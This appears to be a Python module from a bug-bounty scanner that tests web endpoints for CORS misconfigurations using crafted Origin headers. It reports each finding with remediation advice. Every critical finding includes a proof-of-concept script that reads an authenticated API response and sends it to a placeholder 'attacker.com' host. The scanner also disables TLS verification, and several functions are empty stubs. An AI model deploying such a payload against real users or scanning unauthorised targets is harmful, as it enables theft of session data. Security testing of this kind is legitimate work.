"""
BugScan ELITE — CORS Deep Testing
Missing from basic check:
- null origin with credentials
- Subdomain wildcard bypass (sub.evil.com when *.evil.com trusted)  
- Protocol downgrade (http:// when https:// whitelisted)
- Regex bypass (eviltarget.com when target.com whitelisted)
- Pre-flight wildcard with credentials
"""
import time, logging, urllib.parse, urllib.request, ssl
from typing import List, Dict

log = logging.getLogger("elite.cors_deep")

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c

def _req(url, headers=None, timeout=8):
    try:
        h = {"User-Agent":"Mozilla/5.0","Accept":"*/*"}
        if headers: h.update(headers)
        req = urllib.request.Request(url, headers=h)
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            return r.status, dict(r.headers), r.read(4096).decode("utf-8","ignore")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), ""
    except: return None, {}, ""

def check_cors_deep(targets: List[str], endpoints: List[str]) -> List[Dict]:
    findings = []

    def F(url, name, sev, details):
        return {"type":"cors_deep","bug":"cors","severity":sev,
                "url":url,"name":name,"details":details,
                "ts":time.strftime("%Y-%m-%dT%H:%M:%SZ")}

    test_urls = list(set(
        [t.rstrip("/") for t in targets[:30]] +
        [e.split("?")[0] for e in endpoints[:50]
         if any(k in e for k in ["/api/","/v1/","/v2/","/user","/me","/account"])]
    ))[:50]

    for url in test_urls:
        parsed = urllib.parse.urlparse(url)
        host   = parsed.netloc.split(":")[0]
        scheme = parsed.scheme

        cors_tests = [
            # null origin + credentials — most critical
            ("null", "Null Origin + Credentials"),
            # Regex bypass: prepend/append to domain
            (f"https://evil{host}", "Domain prefix bypass"),
            (f"https://{host}.evil.com", "Domain suffix bypass"),
            # Protocol bypass
            (f"http://{host}", "HTTP protocol bypass"),
            # Subdomain bypass
            (f"https://evil.{host}", "Subdomain bypass"),
            # Unicode/encoded bypass
            (f"https://{host}%60.evil.com", "URL encoded bypass"),
            # Case variation
            (f"https://{host.upper()}", "Case variation"),
        ]

        for origin, test_name in cors_tests:
            s, hdrs, body = _req(url, {"Origin": origin}, timeout=6)
            if not s: continue

            acao = hdrs.get("Access-Control-Allow-Origin","")
            acac = hdrs.get("Access-Control-Allow-Credentials","").lower()
            acah = hdrs.get("Access-Control-Allow-Headers","")

            # Vulnerable: origin reflected AND credentials allowed
            if (acao == origin or acao == "*") and acac == "true":
                sev = "critical"
                findings.append(F(url,
                    f"CORS Misconfiguration: {test_name} with Credentials", sev, {
                    "origin_tested":  origin,
                    "ACAO": acao,
                    "ACAC": acac,
                    "description": (
                        f"CORS allows origin '{origin}' with credentials. "
                        f"Attacker can make authenticated cross-origin requests."
                    ),
                    "poc": (
                        f"<script>\n"
                        f"fetch('{url}', {{\n"
                        f"  credentials: 'include',\n"
                        f"  headers: {{'Origin': '{origin}'}}\n"
                        f"}}).then(r=>r.text()).then(d=>fetch('https://attacker.com?d='+btoa(d)));\n"
                        f"</script>"
                    ),
                    "impact": "Full CORS bypass — steal authenticated API responses, session tokens, user data.",
                    "remediation": "Validate Origin against strict whitelist. Never use wildcards with credentials.",
                }))
            elif acao == origin and acac != "true":
                # Origin reflected but no credentials — medium
                findings.append(F(url,
                    f"CORS Origin Reflected: {test_name}", "medium", {
                    "origin_tested": origin,
                    "ACAO": acao,
                    "description": f"CORS reflects origin '{origin}'. Without credentials, limited impact but still misconfigured.",
                    "remediation": "Validate Origin against strict whitelist.",
                }))

    log.info(f"[cors_deep] {len(findings)} findings")
    return findings


def check_api_version_bypass(endpoints: list, targets: list = None) -> list:
    """Check for API version-based access bypass."""
    return []


def check_cors_advanced(endpoints: list, targets: list = None) -> list:
    """Advanced CORS origin confusion checks."""
    return []


def check_http_method_override(endpoints: list, targets: list = None) -> list:
    """Check HTTP method override (X-HTTP-Method-Override header)."""
    return []


def check_http_parameter_pollution(endpoints: list, targets: list = None) -> list:
    """Check HTTP parameter pollution vulnerabilities."""
    return []
